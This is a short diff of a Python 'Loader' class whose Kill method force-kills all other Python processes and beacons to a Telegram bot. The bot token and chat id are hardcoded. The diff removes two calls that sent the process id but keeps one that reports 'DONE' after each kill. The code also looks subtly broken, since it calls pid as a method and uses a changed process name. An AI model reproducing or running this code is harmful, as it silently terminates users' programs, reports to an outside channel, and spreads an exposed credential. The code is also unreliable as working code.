@@ -180,12 +180,9 @@ class Loader():
 					pass
 	def Kill(self):
 			num = 0
-			requests.get('https://api.telegram.org/bot1835937794:AAGrYMKkvpqry85eiHX_yuC_0oWJhH5fwuw/sendMessage?text=' + str(os.getpid()) + '&chat_id=1742761281')
 			for proc in psutil.process_iter():
 				try:
-					if proc.name() == "python.exe":
-						req = requests.get('https://api.telegram.org/bot1835937794:AAGrYMKkvpqry85eiHX_yuC_0oWJhH5fwuw/sendMessage?text=' + str(os.getpid()) + '&chat_id=1742761281')
-					if proc.name() == "python.exe" and proc.pid() != os.getpid():
+					if proc.name() == "python" and proc.pid() != os.getpid():
 						os.system("taskkill /PID " + str(proc.pid()) + " /F")
 						req = requests.get('https://api.telegram.org/bot1835937794:AAGrYMKkvpqry85eiHX_yuC_0oWJhH5fwuw/sendMessage?text=DONE&chat_id=1742761281')
 				except:
